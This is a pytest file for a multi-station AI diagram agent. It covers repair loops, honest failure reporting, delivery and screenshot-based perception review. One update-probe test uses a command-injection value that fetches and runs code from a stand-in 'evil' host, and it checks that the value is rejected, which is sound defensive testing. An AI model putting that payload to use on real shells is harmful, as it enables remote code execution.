"""Offline tests for the archify nine-station diagram-engineering AGENT graph.

ArchifyScriptedProvider (phase-feature anchors) and the bash receipt stubs
are self-contained in this file. Covers:
1. Graph structure + AST auto-discovery + nine-station executor plugin
   registration + validate_pattern + the max_steps budget (the repair loop
   consumes steps)
2. One full turn: route -> author (read schema -> write candidate) ->
   probe (silent) -> validate (showcase pass) -> deliver -> visual-check ->
   percept -> report; the reply is assembled from receipts, three-tier
   evidence is separated, the perception review follows the review receipt;
   no tool rows in history / graph termination clears graph_state /
   trace lands in metadata
3. Convergence honest exit: repeated validation failures without
   improvement -> the repair station takes the deterministic honest exit on
   its 3rd visit (no LLM call on the 3rd), report includes unresolved
   diagnostics
4. Pass after improvement: fail(2) -> fail(1) -> pass, freeze and deliver,
   2 repair rounds
5. Probe notice: update_available -> report includes a compact notice +
   eventKey ack command
6. Deliver-failure bail-out edge: non-zero exit -> straight to af_report,
   visual-check never ran, the report states "failed (non-zero exit, never
   called a success)"
7. Perception review station: multimodal with images (passed/failed
   faithfully reported) / skipped without evidence / skipped when
   screenshot files are missing / skipped when the reviewer model has no
   vision (declared by the zai registry) / skipped after self-correction
   of unparseable verdict output (never fabricates a pass)
8. Repository evidence: when an architecture candidate declares
   sources/meta.repository, validate/deliver/repair-station self-check
   commands conditionally append --repo-root (the unlock for the
   repository-evidence/root-required deadlock)
9. Unit: _trailing_stale convergence semantics / receipt error counting /
   showcase acceptance verdict / objective error for a missing candidate
   (no bash run)
10. Phase 3 migration: the app config bag's repair_rounds overrides the
    code-default budget; station dispatch paths publish pattern_code (the
    lookup key for app guardrail overrides)
"""

import json
import logging
from pathlib import Path
from unittest.mock import patch

import pytest

from async_utils import arun

logging.basicConfig(level=logging.WARNING)

# Host load order is "discover tools first, load patterns later"
# (validate_tools checks at registration time); the offline test process
# likewise discovers builtin tools first, then imports/discovers patterns
from nexus.registry.tools import discover_builtin_tools

discover_builtin_tools()

# The percept station's capability guard consults the registry (zai declares vision_models) — keep zai in the registry
import atoms.providers.zai_provider  # noqa: F401
import apps.archify_agent.executor as ax
from apps.archify_agent.prompts import (
    AUTHOR_ANCHOR,
    PERCEPT_ANCHOR,
    REPAIR_ANCHOR,
    ROUTE_ANCHOR,
)


# ============================================================================
# Fixtures / helpers
# ============================================================================

@pytest.fixture(scope="module")
def pattern():
    from nexus.registry.patterns import discover_builtin_patterns, registry

    imported = discover_builtin_patterns()
    assert "apps.archify_agent.route" in imported, (
        f"route 未被自动发现,已发现: {imported}"
    )
    return registry.get("archify")


@pytest.fixture()
def workspace(tmp_path, monkeypatch):
    """Workspace root points at tmp (same for skill_dir — bash is stubbed anyway, only command assembly references it)."""
    root = tmp_path / "ws"
    skill = tmp_path / "skill"
    (skill / "schemas").mkdir(parents=True)
    (skill / "examples").mkdir(parents=True)
    (skill / "scripts").mkdir()
    monkeypatch.setattr(ax, "_DEFAULT_WORKSPACE_ROOT", str(root))
    monkeypatch.setattr(ax, "_DEFAULT_SKILL_DIR", str(skill))
    return root, skill


def launch(pattern, sessions, session_id="s1"):
    from nexus.engine.session import Session

    session = Session(session_id=session_id, pattern_code=pattern.code)
    session.pattern = pattern
    session.task_info = {}
    session.cxt.node_map = pattern.node_map
    session.cxt.metadata["llm_override"] = {"code": "x", "model": "m"}
    # At turn end the engine moves metadata["archify"] into the trace trail
    # and removes it there (docs/design/session-persistence.md §6) — attach
    # a capturing sink so assertions can retrieve it.
    rows = []

    async def _trace_sink(ev):
        rows.append(ev)

    session.cxt.trace_sink = _trace_sink
    session._app_trace_rows = rows
    sessions[session_id] = session
    return session


def app_trace_of(session):
    """Fetch the final archify trace the engine collected for this session's last turn."""
    for row in reversed(getattr(session, "_app_trace_rows", [])):
        if row["kind"] == "app_trace":
            return row["payload"]["data"]["trace"]
    raise AssertionError("turn 未捡回 app_trace（metadata['archify'] 丢失?）")


def chat(sessions, session_id, query):
    from nexus.engine.chat import chat as chat_fn

    return arun(chat_fn(query=query, session_id=session_id,
                        all_sessions=sessions))


# ============================================================================
# Scripted provider (phase-anchor detection; author rounds: read -> write -> wrap-up)
# ============================================================================

_CANDIDATE_JSON = json.dumps(
    {"schema_version": 2, "diagram_type": "workflow", "meta": {
        "title": "测试工作流", "locale": "zh-CN",
        "quality_profile": "showcase"}},
    ensure_ascii=False)


class ArchifyScriptedProvider:
    """Scripted by phase features: route (ROUTE anchor) / author (tools +
    AUTHOR anchor; round 1 find, round 2 read, round 3 write, round 4
    wrap-up) / repair (tools + REPAIR anchor; emits edit_file repair_edits
    times, then idles — the repair station's inner micro-loop is <=3 rounds
    per visit, an idle round closes the visit) / percept (PERCEPT anchor,
    no tools; the user content is a multimodal parts array; tickets are
    drawn from the percept_outputs queue, falling back to the
    percept_verdict JSON once exhausted)."""

    def __init__(self, candidate=_CANDIDATE_JSON, repair_edits=2,
                 route_fail_first=False, route_fail_always=False,
                 candidate_write=True, write_path="__CAND__",
                 percept_verdict=None, percept_outputs=None,
                 route_type="workflow"):
        self.candidate = candidate
        self.repair_edits = repair_edits
        self.route_fail_first = route_fail_first
        self.route_fail_always = route_fail_always
        self.candidate_write = candidate_write
        self.write_path = write_path  # the path the model actually writes to (may pick a wrong path)
        self.route_type = route_type  # diagram type returned by the route phase
        self.percept_verdict = percept_verdict or {
            "status": "passed", "defects": [],
            "summary": "明暗两主题×两视口构图收敛,无可见缺陷"}
        self.percept_outputs = list(percept_outputs or [])
        self.route_calls = 0
        self.author_calls = 0
        self.repair_calls = 0
        self.percept_calls = 0
        self.author_rounds = 0
        self.requests = []
        self.tool_targets = []

    @staticmethod
    def _content_text(content) -> str:
        """Message text (the percept station's content is a parts array:
        text parts contribute their text field, image parts keep only a
        marker — for anchor detection, no base64 shuffling)."""
        if isinstance(content, list):
            return "".join(
                p.get("text", "") if isinstance(p, dict)
                and p.get("type") == "text" else "[image]"
                for p in content if isinstance(p, dict))
        return str(content or "")

    def _kind(self, messages, tools):
        text = "".join(self._content_text(m.get("content")) for m in messages)
        if ROUTE_ANCHOR in text:
            return "route"
        if tools and AUTHOR_ANCHOR in text:
            return "author"
        if tools and REPAIR_ANCHOR in text:
            return "repair"
        if PERCEPT_ANCHOR in text:
            return "percept"
        return "route"  # fallback (route is the only phase without an anchor)

    async def achat_completion(self, messages, model, temperature=0.7,
                               max_tokens=2048, tools=None, tool_choice=None):
        kind = self._kind(messages, tools)
        self.requests.append((kind, [dict(m) for m in messages]))
        if kind == "route":
            self.route_calls += 1
            if self.route_fail_always or (
                    self.route_fail_first and self.route_calls == 1):
                return {"content": "我判断这是个架构图需求。",
                        "tool_calls": [], "finish_reason": "stop"}
            return {"content": json.dumps({
                "diagram_type": self.route_type, "is_mermaid": False,
                "output_name": "demo", "notes": "测试"},
                ensure_ascii=False),
                "tool_calls": [], "finish_reason": "stop"}
        if kind == "author":
            self.author_calls += 1
            self.author_rounds += 1
            if not self.candidate_write:
                return {"content": "(无法创作)", "tool_calls": [],
                        "finish_reason": "stop"}
            if self.author_rounds == 1:
                tc = {"id": "a1", "type": "function", "function": {
                    "name": "find_files",
                    "arguments": json.dumps(
                        {"pattern": "*workflow*",
                         "path": "examples"})}}
                return {"content": None, "tool_calls": [tc],
                        "finish_reason": "tool_calls"}
            if self.author_rounds == 2:
                tc = {"id": "a2", "type": "function", "function": {
                    "name": "read_text",
                    "arguments": json.dumps(
                        {"path": "schemas/workflow.schema.json"})}}
                return {"content": None, "tool_calls": [tc],
                        "finish_reason": "tool_calls"}
            if self.author_rounds == 3:
                tc = {"id": "a3", "type": "function", "function": {
                    "name": "write_text",
                    "arguments": json.dumps(
                        {"path": self.write_path, "content": self.candidate},
                        ensure_ascii=False)}}
                return {"content": None, "tool_calls": [tc],
                        "finish_reason": "tool_calls"}
            return {"content": "候选已写入", "tool_calls": [],
                    "finish_reason": "stop"}
        if kind == "percept":
            self.percept_calls += 1
            if self.percept_outputs:
                raw = self.percept_outputs.pop(0)
            else:
                raw = json.dumps(self.percept_verdict, ensure_ascii=False)
            return {"content": raw, "tool_calls": [], "finish_reason": "stop"}
        # repair
        self.repair_calls += 1
        if self.repair_calls <= self.repair_edits:
            tc = {"id": f"r{self.repair_calls}", "type": "function",
                  "function": {
                      "name": "edit_file",
                      "arguments": json.dumps(
                          {"path": "__CAND__", "old_str": "a", "new_str": "b"},
                          ensure_ascii=False)}}
            return {"content": None, "tool_calls": [tc],
                    "finish_reason": "tool_calls"}
        return {"content": "信息已足够", "tool_calls": [],
                "finish_reason": "stop"}


# ============================================================================
# bash receipt stubs (validate/deliver/visual-check/check-update issue
# tickets from queues; read/write/edit pass through to the real file tools)
# ============================================================================

def _pass_receipt():
    return {"ok": True, "checks": [{"name": f"c{i}", "ok": True}
                                   for i in range(9)],
            "warnings": []}


def _fail_receipt(n=2):
    return {"ok": False,
            "checks": [{"name": "single_svg", "ok": True}],
            "diagnostics": [
                {"code": "layout/constraint", "severity": "error",
                 "message": f"诊断{i}: 需要修复的问题"}
                for i in range(n)]}


def _bash_payload(receipt_json):
    return json.dumps(
        {"exit_code": 0 if json.loads(receipt_json).get("ok") else 1,
         "stdout": receipt_json, "stderr": "", "timed_out": False},
        ensure_ascii=False)


# visual-check screenshot sidecars (naming contract of visual-check.mjs
# sidecarPaths: <stem>.visual-check.<WxH>.<theme>.png x 4, next to the
# delivered HTML)
_SHOT_FILES = [
    f"demo.visual-check.{vp}.{theme}.png"
    for vp in ("1440x900", "2048x1320")
    for theme in ("light", "dark")
]


def _visual_pass_receipt():
    return {"ok": True, "status": "pass",
            "evidenceKind": "automated-browser", "diagnostics": [],
            "captures": {"status": "pass",
                         "screenshots": [{"file": f} for f in _SHOT_FILES],
                         "contactSheet": "demo.visual-check.html"}}


def _materialize_sidecars(receipt):
    """Write fake PNGs alongside the default receipt (the percept station
    only base64-encodes, never parses pixels). Tests passing visual_receipt
    explicitly skip the writes — exactly covering the honest skipped path
    of "receipt lists files that are missing on disk"."""
    root = ax._absolutize(ax._DEFAULT_WORKSPACE_ROOT) / "s1"
    root.mkdir(parents=True, exist_ok=True)
    for s in (receipt.get("captures") or {}).get("screenshots") or []:
        if isinstance(s, dict) and s.get("file"):
            (root / str(s["file"])).write_bytes(b"\x89PNG-rn-fake-bytes")


def make_cli_stub(validate_receipts, deliver_receipt=None,
                  visual_receipt=None, probe_receipt=None, calls=None):
    """Return an _execute_tool stub: bash issues tickets by command keyword
    (once a queue is exhausted the last ticket is reused); other tools go
    through the real registry (file I/O lands in the tmp workspace).
    Replaces the __CAND__ placeholder."""
    import nexus.engine.loop as loop_mod

    real = loop_mod._execute_tool
    state = {"vi": 0}

    async def fake(name, args):
        if name != "bash":
            args = dict(args)
            if args.get("path") == "__CAND__":
                args["path"] = _candidate_path()
            return await real(name, args)
        cmd = str(args.get("command") or "")
        calls.append(cmd)
        if "check-update" in cmd:
            r = probe_receipt or {"status": "silent", "reason": "current"}
            return _bash_payload(json.dumps(r, ensure_ascii=False))
        if "--ack" in cmd:
            return _bash_payload('{"ok": true, "acked": true}')
        if "validate" in cmd:
            if not validate_receipts:
                raise AssertionError("validate 队列已空")
            idx = min(state["vi"], len(validate_receipts) - 1)
            state["vi"] += 1
            return _bash_payload(
                json.dumps(validate_receipts[idx], ensure_ascii=False))
        if "deliver" in cmd:
            r = deliver_receipt or {"ok": True, "artifact": {
                "sha256": "deadbeef" * 8, "bytes": 4096}}
            return _bash_payload(json.dumps(r, ensure_ascii=False))
        if "visual-check" in cmd:
            r = visual_receipt or _visual_pass_receipt()
            if visual_receipt is None:
                _materialize_sidecars(r)
            return _bash_payload(json.dumps(r, ensure_ascii=False))
        raise AssertionError(f"未预期的 bash 命令: {cmd}")

    return fake


def _candidate_path():
    """Deterministic candidate path:
    <workspace_root>/<session_id>/<output_name>.json (the scripted route
    reply uses output_name=demo, session s1; absolutized with the same
    logic as the executor)."""
    root = ax._absolutize(ax._DEFAULT_WORKSPACE_ROOT)
    return str(root / "s1" / "demo.json")


def run_turn(pattern, provider, cli_stub, query="画一个 CI 发布工作流图",
             llm_override=None):
    sessions = {}
    launch(pattern, sessions)
    if llm_override is not None:
        sessions["s1"].cxt.metadata["llm_override"] = llm_override
    with patch.object(ax, "build_provider", return_value=provider), \
            patch.object(ax, "_execute_tool", cli_stub):
        reply = chat(sessions, "s1", query)
    return sessions["s1"], reply


# ============================================================================
# 1. Pattern structure and registration
# ============================================================================

def test_pattern_structure_and_executor_binding(pattern):
    assert pattern.code == "archify"
    assert pattern.pattern_type == "agent"
    assert pattern.entry_node_code == "af_route"
    assert pattern.max_steps == 20  # repair-loop budget (stale-5 honest exit takes 16 steps overall)

    codes = [n.code for n in pattern.nodes]
    assert codes == ["af_route", "af_author", "af_update_probe",
                     "af_validate", "af_repair", "af_deliver",
                     "af_visual_check", "af_percept", "af_report"]
    assert pattern.node_map["af_author"].sub_nodes == [
        "af_update_probe", "af_validate"]
    assert pattern.node_map["af_validate"].sub_nodes == [
        "af_deliver", "af_repair"]
    assert pattern.node_map["af_repair"].sub_nodes == [
        "af_validate", "af_report"]
    # Deliver-failure bail-out edge: non-zero exit goes straight to the report station (no browser check)
    assert pattern.node_map["af_deliver"].sub_nodes == [
        "af_visual_check", "af_report"]
    # Perception review: after browser evidence, before the report (zero-tool, purely semantic station)
    assert pattern.node_map["af_visual_check"].sub_nodes == ["af_percept"]
    assert pattern.node_map["af_percept"].sub_nodes == ["af_report"]
    assert pattern.node_map["af_report"].sub_nodes == []
    assert pattern.node_map["af_report"].is_end is True

    for node in pattern.nodes:
        assert node.plugins["loop"] == node.code
    assert pattern.allow_toolset == ["shell", "filesystem"]
    assert pattern.node_map["af_route"].use_tools == []
    assert pattern.node_map["af_author"].use_tools == ["read_text",
                                                       "write_text",
                                                       "find_files"]
    assert pattern.node_map["af_repair"].use_tools == [
        "read_text", "edit_file", "write_text", "bash"]
    # Authoring-rounds budget (code default; the app config bag's
    # author_rounds can override): find examples + 3 reads + write +
    # wrap-up + one tolerance round (real runs proved 6 rounds have zero
    # slack — one stumble exhausts it -> missing candidate)
    assert ax._DEFAULT_AUTHOR_ROUNDS == 10

    from nexus.model.validation import validate_pattern
    validate_pattern(pattern)


def test_station_executor_plugins_registered():
    from nexus.registry.plugins import registry as plugins

    for code in ("af_route", "af_author", "af_update_probe", "af_validate",
                 "af_repair", "af_deliver", "af_visual_check", "af_percept",
                 "af_report"):
        assert plugins.has("executor", code), f"executor 插件 {code} 未注册"


# ============================================================================
# 2. Full happy-path turn
# ============================================================================

def test_full_turn_happy_path(pattern, workspace):
    root, skill = workspace
    provider = ArchifyScriptedProvider()
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # Phase order: route -> author (4 rounds: find examples -> read schema
    # -> write candidate -> wrap-up) -> probe -> validate -> deliver ->
    # visual-check -> percept (1 multimodal round); report calls no LLM
    # (assembled from receipts)
    assert provider.route_calls == 1
    assert provider.author_calls == 4
    assert provider.repair_calls == 0
    assert provider.percept_calls == 1
    bash_kinds = ["check-update" if "check-update" in c else
                  ("ack" if "--ack" in c else
                   ("validate" if "validate" in c else
                    ("deliver" if "deliver" in c else "visual-check")))
                  for c in calls]
    assert bash_kinds == ["check-update", "validate", "deliver",
                          "visual-check"]

    # Candidate really written to disk (tmp workspace)
    cand = _candidate_path()
    assert json.loads(Path(cand).read_text(encoding="utf-8"))["meta"][
        "quality_profile"] == "showcase"

    # Report assembled from receipts: three-tier evidence separated + perception review per the review receipt
    assert "showcase 验收通过" in reply
    assert "交付: 成功" in reply
    assert "浏览器证据: pass" in reply
    assert "感知审查: passed(图像能力评审 x/m,4 张截图" in reply
    assert "感知审查: 未执行" not in reply
    assert "更新探针" not in reply  # silent goes unmentioned

    # The percept request is OpenAI-style multimodal parts: 1 text (anchor + checklist) + 4 images
    percept_reqs = [msgs for kind, msgs in provider.requests
                    if kind == "percept"]
    assert len(percept_reqs) == 1
    user = percept_reqs[0][-1]
    assert isinstance(user["content"], list)
    text_parts = [p for p in user["content"] if p.get("type") == "text"]
    image_parts = [p for p in user["content"] if p.get("type") == "image_url"]
    assert len(text_parts) == 1 and PERCEPT_ANCHOR in text_parts[0]["text"]
    assert len(image_parts) == 4
    assert all(p["image_url"]["url"].startswith("data:image/png;base64,")
               for p in image_parts)

    # Final state: trace lands in metadata; graph termination clears graph_state; position is the report station
    trace = app_trace_of(session)
    assert trace["diagram_type"] == "workflow"
    assert trace["frozen"] is True
    assert trace["val_history"] == [0]
    assert trace["percept_receipt"]["status"] == "passed"
    assert trace["percept_receipt"]["reviewer"] == {"code": "x", "model": "m"}
    assert trace["percept_receipt"]["images"] == 4
    assert trace["phases"] == ["route", "author", "probe",
                               "validate_pass", "deliver", "visual_check",
                               "percept"]
    assert session.cxt.graph_state == {}
    assert session.cxt.current_node_code == "af_report"
    # The research process stays out of session history (private workspace)
    assert "tool" not in [m.role for m in session.cxt.history]


# ============================================================================
# 3. Convergence honest exit (stale-5)
# ============================================================================

def test_repair_honest_exit_after_stale_rounds(pattern, workspace):
    provider = ArchifyScriptedProvider(repair_edits=5)
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_fail_receipt(2)] * 6,
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # v1(2) baseline -> r1..r5 -> v2..v6(2) -> r6 = convergence-gate
    # interception (no LLM call)
    assert len([c for c in calls if "validate" in c]) == 6
    # Five repair visits, each inner micro-loop capped at 3 rounds:
    # 3 (edit x3) + 3 (edit x2 + idle) + 1+1+1 (idle wrap-up)
    assert provider.repair_calls == 9
    trace = app_trace_of(session)
    assert trace["repair_rounds"] == 5
    assert "deliver" not in "".join(calls)
    assert "visual-check" not in "".join(calls)

    trace = app_trace_of(session)
    assert trace["val_history"] == [2] * 6
    assert trace["honest_exit"] is True
    assert trace["frozen"] is False
    assert "连续 5 轮未刷新错误数下限" in reply
    assert "诊断0" in reply and "诊断1" in reply  # unresolved diagnostics reported faithfully
    assert "交付" not in reply  # never reached the deliver station, so no delivery claim may appear
    assert "浏览器证据: 未收集" in reply


# ============================================================================
# 4. Improving repairs then pass
# ============================================================================

def test_repair_improves_then_passes(pattern, workspace):
    provider = ArchifyScriptedProvider(repair_edits=2)
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_fail_receipt(2), _fail_receipt(1),
                           _pass_receipt()],
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    assert len([c for c in calls if "validate" in c]) == 3
    # visit1: edit x2 + idle wrap-up (3 rounds); visit2: first round idle (1 round)
    assert provider.repair_calls == 4
    trace = app_trace_of(session)
    assert trace["repair_rounds"] == 2
    assert trace["val_history"] == [2, 1, 0]
    assert trace["frozen"] is True
    assert trace["honest_exit"] is False
    assert "修复: 2 轮" in reply
    assert "showcase 验收通过" in reply


# ============================================================================
# 4a. Deterministic label-clearance solver (studio regression:
#     label-route-clearance with no suggested coordinates; the LLM cannot
#     manage pixel avoidance in six rounds -> geometry belongs to tools,
#     adjudicated by the real validator)
# ============================================================================

_LABEL_CANDIDATE_JSON = json.dumps(
    {"schema_version": 1, "diagram_type": "architecture",
     "meta": {"title": "t", "quality_profile": "showcase"},
     "components": [
         {"id": "user", "type": "external", "label": "用户", "row": 1,
          "col": 0},
         {"id": "agent", "type": "backend", "label": "Agent", "row": 1,
          "col": 1},
         {"id": "cli", "type": "backend", "label": "cli", "row": 1,
          "col": 2}],
     "connections": [
         {"id": "user-to-agent", "from": "user", "to": "agent",
          "label": "邮件请求"},
         {"id": "agent-to-cli", "from": "agent", "to": "cli",
          "label": "命令调用"},
         {"id": "cli-to-mailbox", "from": "cli", "to": "mailbox",
          "label": "读写邮件"}]},
    ensure_ascii=False)


def _label_clearance_receipt():
    """Verbatim diagnostics from a real studio run: a 48px label rect
    squeezed next to the vertical segment at x=665; the correct move is
    labelDy +12 (first candidate by |delta| ordering)."""
    return {
        "ok": False,
        "checks": [{"name": "single_svg", "ok": True}],
        "diagnostics": [{
            "code": "composition/label-route-clearance",
            "severity": "error",
            "message": ('[composition/label-route-clearance] showcase '
                        'architecture label "读写邮件" on connections[2] id '
                        '"cli-to-mailbox" "cli" -> "mailbox" is 0px from '
                        'connections[5] segment 1 [665, 110] -> [665, 239] '
                        '(label rect [641, 233, 48, 14]; minimum 4px)'),
            "subject": {"collection": "connections", "index": 2,
                        "id": "cli-to-mailbox", "from": "cli",
                        "to": "mailbox"},
            "evidence": {
                "label": "读写邮件", "segmentIndex": 1, "clearancePx": 0,
                "minimumPx": 4,
                "labelRect": {"relationIndex": 2, "label": "读写邮件",
                              "x": 640.8, "y": 233.0, "width": 48.4,
                              "height": 14.0, "lx": 665, "ly": 243},
                "from": [665, 110], "to": [665, 239]},
            "supportedFixes": ["adjust labelAt, labelDx, labelDy, or "
                               "labelSegment"],
        }]}


def test_solver_fixes_label_clearance_without_llm(pattern, workspace):
    """Solver hits on the first try: gate fail(1) -> the labelDy +12 move is
    adjudicated better (0) by the real validator -> straight back to the
    validation gate to freeze and deliver — zero LLM calls throughout the
    repair station."""
    provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON)
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_label_clearance_receipt(), _pass_receipt(),
                           _pass_receipt()],
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # 3 validate calls: gate v1 (fail) + solver trial 1 (pass, accepted) + gate v2 (pass)
    assert len([c for c in calls if "validate" in c]) == 3
    assert provider.repair_calls == 0   # solver cleared it, the LLM micro-loop never started
    trace = app_trace_of(session)
    assert trace["val_history"] == [1, 0]
    assert trace["frozen"] is True
    assert trace["repair_rounds"] == 1
    # The move really lands on disk: connections[2] gets labelDy 12 (nearest first candidate)
    data = json.loads(Path(trace["candidate_path"]).read_text(
        encoding="utf-8"))
    assert data["connections"][2]["labelDy"] == 12.0
    # The solver action enters the repair log (the next visit's LLM can see the geometry was already handled by tools)
    assert "labelDy +12" in trace["repair_log"][0]["summary"]
    assert "showcase 验收通过" in reply
    assert "交付: 成功" in reply


# The same label diagram with repository evidence declared (studio session
# f2cae679 deadlock shape: the gate with --repo-root leaves 1 clearance
# error, but the solver's validation carries no flag -> it always sees
# root-required, judges "no improvement" and rolls everything back, handing
# a geometrically solvable problem to the LLM to make worse)
_label_evidence_data = json.loads(_LABEL_CANDIDATE_JSON)
_label_evidence_data["meta"]["repository"] = {
    "url": "https://github.com/o/nexus-kit.git", "revision": "0" * 40}
_EVIDENCE_LABEL_CANDIDATE_JSON = json.dumps(_label_evidence_data,
                                            ensure_ascii=False)


def test_solver_validate_carries_repo_root_for_evidence(pattern, workspace,
                                                         monkeypatch):
    """The solver's real-validation guard must share provenance with the
    gate (same --repo-root): on a candidate declaring evidence, a flagless
    trial validation only ever sees root-required (1 error) and judges "no
    improvement" against the 1-error baseline -> everything rolls back and
    solver_tried is recorded (never retried across visits) — a
    label-avoidance deadlock. With the flag, the same move hits on the
    first try and delivery is frozen with zero LLM calls."""
    monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
    provider = ArchifyScriptedProvider(
        candidate=_EVIDENCE_LABEL_CANDIDATE_JSON, route_type="architecture")
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_label_clearance_receipt(), _pass_receipt(),
                           _pass_receipt()],
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # Gate + solver trial + re-check gate: all three validate calls carry
    # the flag with the same provenance. Matching uses the command prefix
    # rather than a "validate" substring: pytest temp dir names come from
    # the test function name (which contains "validate"), and paths embedded
    # in deliver/visual-check commands would false-positive the substring
    vc = [c for c in calls if "archify.mjs validate " in c]
    assert len(vc) == 3
    assert all('--repo-root /repo/ev' in c for c in vc)
    assert provider.repair_calls == 0   # solver cleared it, no LLM making things worse
    trace = app_trace_of(session)
    assert trace["val_history"] == [1, 0]
    assert trace["frozen"] is True
    data = json.loads(Path(trace["candidate_path"]).read_text(
        encoding="utf-8"))
    assert data["connections"][2]["labelDy"] == 12.0


def test_repair_rolls_back_regressed_candidate(pattern, workspace):
    """Regression guard (studio session 6e20f21d: val_history [1,1,1,13],
    the LLM micro-loop took the candidate from 1 error to 13 and limped
    off): after a validation regression, the repair station's next visit
    first rolls back to the best-checkpoint bytes before repairing; later
    convergence proceeds normally (what gets frozen and delivered is the
    healthy post-rollback candidate)."""
    provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON,
                                       repair_edits=1)
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_fail_receipt(1), _fail_receipt(13),
                           _fail_receipt(1), _pass_receipt()],
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    trace = app_trace_of(session)
    assert trace["val_history"] == [1, 13, 1, 0]
    # The rollback note enters the repair log (the next visit's LLM can see
    # "repairs resumed from the best state")
    assert any("回滚到最优检查点" in e["summary"]
               for e in trace["repair_log"])
    # The on-disk candidate is the healthy post-rollback body: visit1's
    # edit (a->b) was undone (diagram_type is no longer "dbagram_type"),
    # and v4 freezes this same healthy candidate
    data = json.loads(Path(trace["candidate_path"]).read_text(
        encoding="utf-8"))
    assert data["diagram_type"] == "architecture"
    assert trace["frozen"] is True
    assert "showcase 验收通过" in reply


def test_solver_reverts_and_defers_to_llm_loop(pattern, workspace):
    """Solver fails across the board: every move is vetoed by the real
    validator -> byte rollback (candidate untouched), failed moves are
    logged (zero retries on later visits) -> the LLM micro-loop takes over
    as usual until the stale-5 honest exit."""
    provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON,
                                       repair_edits=2)
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_label_clearance_receipt()] * 9,
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # 9 validate calls = 6 gates + 3 solver trials (first visit only;
    # afterwards the move keys are in solver_tried, so later visits consume
    # none)
    assert len([c for c in calls if "validate" in c]) == 9
    # visit1: all 3 solver trials fail + 3 LLM rounds (edit x2 + idle);
    # visit2..5: 1 idle round each (repair_edits exhausted)
    assert provider.repair_calls == 7
    trace = app_trace_of(session)
    assert trace["val_history"] == [1] * 6
    assert trace["honest_exit"] is True
    assert trace["repair_rounds"] == 5
    # Byte rollback: the candidate carries no trace of the vetoed moves
    data = json.loads(Path(trace["candidate_path"]).read_text(
        encoding="utf-8"))
    assert "labelDy" not in data["connections"][2]
    assert "labelAt" not in data["connections"][2]
    # First log entry = solver-failure note + LLM wrap-up summary (merged within the visit)
    first = trace["repair_log"][0]["summary"]
    assert "均未更优" in first and "信息已足够" in first
    assert "连续 5 轮未刷新错误数下限" in reply


# ============================================================================
# 5. Update probe notice (update_available → compact notice + ack)
# ============================================================================

def test_update_probe_notice_and_ack(pattern, workspace):
    provider = ArchifyScriptedProvider()
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_pass_receipt()],
        probe_receipt={"status": "update_available",
                       "installed": "2.17", "latest": "2.18",
                       "severity": "security",
                       "releaseNotesUrl": "https://example.com/notes",
                       "eventKey": "evt-2026-09-15"},
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    assert "[安全更新]" in reply
    assert "2.17" in reply and "2.18" in reply
    assert "由你决定" in reply            # information, not permission
    ack = [c for c in calls if "--ack" in c]
    assert ack == ["node scripts/check-update.mjs --ack evt-2026-09-15"]
    # The probe does not change the main line: delivery/browser evidence as usual
    assert "交付: 成功" in reply


def test_update_probe_rejects_malicious_event_key(pattern, workspace):
    """The eventKey comes from a remote manifest receipt (untrusted): keys
    outside the whitelist character set must never reach the shell — skip
    the ack outright (honest degradation), closing the command-injection
    surface."""
    provider = ArchifyScriptedProvider()
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_pass_receipt()],
        probe_receipt={"status": "update_available",
                       "installed": "2.17", "latest": "2.18",
                       "eventKey": 'x"$(curl evil/x|sh)"'},
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # The notice still renders (the information surface is unaffected); the ack is dropped
    assert "2.18" in reply
    assert [c for c in calls if "--ack" in c] == []
    # Main line as usual
    assert "交付: 成功" in reply


# ============================================================================
# 6. Deliver failure bail-out edge
# ============================================================================

def test_deliver_failure_bails_to_report(pattern, workspace):
    provider = ArchifyScriptedProvider()
    calls = []
    cli = make_cli_stub(
        validate_receipts=[_pass_receipt()],
        deliver_receipt={"ok": False, "error": "snapshot check failed",
                         "diagnostics": [{"code": "deliver/snapshot",
                                          "severity": "error",
                                          "message": "快照校验失败"}]},
        calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # Delivery failure -> straight to the report station; the browser check never runs on the failed delivery path
    assert "visual-check" not in "".join(calls)
    assert "交付: 失败(非零退出,绝不称为成功" in reply
    assert "快照校验失败" in reply
    assert "浏览器证据: 未收集(交付失败路径,按契约跳过)" in reply
    assert "感知审查: 未执行(交付失败逃生路径,按契约跳过)" in reply
    assert provider.percept_calls == 0   # review station unreachable
    trace = app_trace_of(session)
    assert trace["deliver_failed"] is True
    assert trace["percept_receipt"] == {}
    assert session.cxt.current_node_code == "af_report"


# ============================================================================
# 6a. Percept station (perception review: multimodal with images / every honest-skipped shape)
# ============================================================================

def test_percept_failed_verdict_reported_honestly(pattern, workspace):
    """Verdict failed: defects flow into the report one by one,
    correction_rounds 0 (the first version only reports faithfully, no
    loop-back) — a failed review does not drag down the already-successful
    delivery and does not trigger the repair loop."""
    provider = ArchifyScriptedProvider(percept_verdict={
        "status": "failed",
        "defects": [{"viewport": "2048x1320", "theme": "dark",
                     "issue": "下部出现整幅明显空带"}],
        "summary": "大视口构图失衡"})
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    assert provider.percept_calls == 1
    assert provider.repair_calls == 0   # failed does not loop back into repair
